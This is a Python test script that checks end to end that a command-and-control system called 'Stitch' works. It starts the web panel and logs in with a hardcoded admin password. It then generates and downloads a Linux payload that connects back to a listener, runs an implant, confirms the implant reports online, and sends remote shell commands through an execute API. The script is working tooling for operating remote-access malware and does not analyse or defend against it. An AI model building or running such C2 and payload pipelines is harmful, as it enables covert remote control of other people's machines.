#!/usr/bin/env python3
"""
Complete working test with all fixes applied
"""

import os
import sys
import time
import subprocess
import requests
import re
import json

os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'securepassword123'

class WorkingSystemTest:
    def __init__(self):
        self.server_proc = None
        self.payload_proc = None
        self.session = requests.Session()
        self.csrf_token = None
        
    def start_server(self):
        """Start web server"""
        print("[*] Starting Stitch web server...")
        
        self.server_proc = subprocess.Popen(
            ['python3', 'web_app_real.py'],
            cwd='/workspace',
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=os.environ.copy()
        )
        
        # Wait for server
        for i in range(10):
            time.sleep(2)
            try:
                resp = requests.get('http://localhost:5000/health')
                if resp.status_code == 200:
                    print("  ✓ Server running")
                    return True
            except:
                continue
        
        print("  ✗ Server failed to start")
        return False
    
    def login(self):
        """Login with CSRF"""
        print("\n[*] Logging in...")
        
        # Get login page for CSRF
        resp = self.session.get('http://localhost:5000/login')
        
        if 'csrf_token' in resp.text:
            match = re.search(r'name="csrf_token".*?value="([^"]+)"', resp.text)
            if match:
                self.csrf_token = match.group(1)
                print(f"  ✓ Got CSRF token")
        
        # Login
        login_data = {
            'username': 'admin',
            'password': 'securepassword123'
        }
        
        if self.csrf_token:
            login_data['csrf_token'] = self.csrf_token
        
        resp = self.session.post(
            'http://localhost:5000/login',
            data=login_data,
            allow_redirects=False
        )
        
        if resp.status_code in [302, 303]:
            print("  ✓ Login successful")
            
            # Get updated CSRF from dashboard
            resp = self.session.get('http://localhost:5000/')
            if 'csrf-token' in resp.text:
                match = re.search(r'name="csrf-token".*?content="([^"]+)"', resp.text)
                if match:
                    self.csrf_token = match.group(1)
                    print("  ✓ Updated CSRF token")
            
            return True
        
        print(f"  ✗ Login failed: {resp.status_code}")
        return False
    
    def generate_payload(self):
        """Generate payload with CSRF"""
        print("\n[*] Generating payload...")
        
        config = {
            'bind_host': '',
            'bind_port': '',
            'listen_host': '127.0.0.1',
            'listen_port': '4040',
            'enable_bind': False,
            'enable_listen': True,
            'platform': 'linux'  # Try for Linux executable
        }
        
        headers = {
            'X-CSRFToken': self.csrf_token,
            'Content-Type': 'application/json'
        }
        
        resp = self.session.post(
            'http://localhost:5000/api/generate-payload',
            json=config,
            headers=headers
        )
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success'):
                print(f"  ✓ Payload generated: {result.get('payload_type')}")
                print(f"    Platform: {result.get('platform')}")
                print(f"    Size: {result.get('payload_size')} bytes")
                
                # Download it
                resp = self.session.get(
                    'http://localhost:5000/api/download-payload',
                    headers={'X-CSRFToken': self.csrf_token}
                )
                
                if resp.status_code == 200:
                    with open('/tmp/test_payload_dl', 'wb') as f:
                        f.write(resp.content)
                    print(f"  ✓ Downloaded payload ({len(resp.content)} bytes)")
                    
                    # Check type
                    with open('/tmp/test_payload_dl', 'rb') as f:
                        header = f.read(4)
                        if header == b'\x7fELF':
                            print("  ✓ Linux ELF executable")
                        else:
                            print("  ⚠ Not ELF (likely Python script)")
                
                return True
            else:
                print(f"  ✗ Generation failed: {result.get('message')}")
        else:
            print(f"  ✗ API error: {resp.status_code}")
        
        return False
    
    def start_payload(self):
        """Start test payload"""
        print("\n[*] Starting payload...")
        
        # Use our working test payload
        payload_path = '/tmp/stitch_payload.py'
        
        if not os.path.exists(payload_path):
            from create_working_payload import create_full_stitch_payload
            code = create_full_stitch_payload()
            with open(payload_path, 'w') as f:
                f.write(code)
            os.chmod(payload_path, 0o755)
        
        self.payload_proc = subprocess.Popen(
            ['python3', payload_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        print(f"  ✓ Payload started (PID: {self.payload_proc.pid})")
        time.sleep(3)
        
        return self.payload_proc.poll() is None
    
    def check_connections(self):
        """Check connections with CSRF"""
        print("\n[*] Checking connections...")
        
        headers = {'X-CSRFToken': self.csrf_token}
        
        resp = self.session.get(
            'http://localhost:5000/api/connections',
            headers=headers
        )
        
        if resp.status_code == 200:
            connections = resp.json()
            print(f"  ✓ Got {len(connections)} connections")
            
            for conn in connections:
                if conn.get('status') == 'online':
                    target = conn.get('target')
                    print(f"    - {target}: online")
                    self.target_id = conn.get('id') or target
                    return True
            
            print("  ✗ No online connections")
        else:
            print(f"  ✗ API error: {resp.status_code}")
        
        return False
    
    def execute_commands(self):
        """Execute commands with CSRF"""
        print("\n[*] Testing command execution...")
        
        if not hasattr(self, 'target_id'):
            print("  ✗ No target available")
            return False
        
        headers = {
            'X-CSRFToken': self.csrf_token,
            'Content-Type': 'application/json'
        }
        
        commands = ['pwd', 'whoami', 'echo "Hello from C2"']
        success_count = 0
        
        for cmd in commands:
            data = {
                'connection_id': self.target_id,
                'command': cmd
            }
            
            resp = self.session.post(
                'http://localhost:5000/api/execute',
                json=data,
                headers=headers
            )
            
            if resp.status_code == 200:
                result = resp.json()
                if result.get('success'):
                    output = result.get('output', '')[:50]
                    print(f"  ✓ {cmd}: {output}...")
                    success_count += 1
                else:
                    print(f"  ✗ {cmd}: {result.get('error')}")
            else:
                print(f"  ✗ {cmd}: API error {resp.status_code}")
        
        return success_count > 0
    
    def run_all_tests(self):
        """Run complete test"""
        print("="*70)
        print("COMPLETE WORKING SYSTEM TEST")
        print("="*70)
        
        results = {}
        
        try:
            # Start server
            results['server'] = self.start_server()
            
            if results['server']:
                # Login
                results['login'] = self.login()
                
                if results['login']:
                    # Generate payload
                    results['payload_gen'] = self.generate_payload()
                    
                    # Start payload
                    results['payload_exec'] = self.start_payload()
                    
                    # Wait for connection
                    time.sleep(3)
                    
                    # Check connections
                    results['connections'] = self.check_connections()
                    
                    if results['connections']:
                        # Execute commands
                        results['commands'] = self.execute_commands()
        
        finally:
            # Cleanup
            print("\n[*] Cleaning up...")
            if self.payload_proc:
                self.payload_proc.terminate()
            if self.server_proc:
                self.server_proc.terminate()
                self.server_proc.wait(timeout=5)
        
        # Summary
        print("\n" + "="*70)
        print("RESULTS SUMMARY")
        print("="*70)
        
        all_passed = True
        for test, passed in results.items():
            status = "✓" if passed else "✗"
            print(f"  {status} {test}")
            if not passed:
                all_passed = False
        
        if all_passed:
            print("\n✓ ALL SYSTEMS OPERATIONAL")
            print("\nThe Stitch C2 system is fully functional:")
            print("  • Web server running")
            print("  • Login working with CSRF")
            print("  • Payload generation working")
            print("  • Payloads connect to C2")
            print("  • Command execution working")
            print("  • All APIs functional with CSRF tokens")
        else:
            print("\n⚠ Some components not working")
        
        return all_passed

if __name__ == "__main__":
    tester = WorkingSystemTest()
    success = tester.run_all_tests()
    sys.exit(0 if success else 1)